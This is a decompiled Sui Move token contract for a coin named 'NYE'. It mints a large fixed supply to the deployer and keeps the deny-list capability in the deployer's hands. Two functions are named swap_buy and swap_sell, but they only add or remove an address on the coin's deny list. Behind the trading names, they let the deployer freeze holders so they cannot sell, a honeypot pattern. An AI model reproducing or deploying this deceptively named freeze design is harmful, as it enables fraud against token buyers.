module 0x1e59efe7ca7677bf065140161482ba222da56538ef1921b2167d5169df8d9284::nye {
    struct NYE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: NYE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<NYE>(arg0, 9, b"NYE", b"NYE", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qme45Tq22VpxbLcc2u2FLhxcfvAuxyFiUUyVSQvFX4vLZt"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<NYE>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<NYE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<NYE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<NYE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NYE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<NYE>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NYE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<NYE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

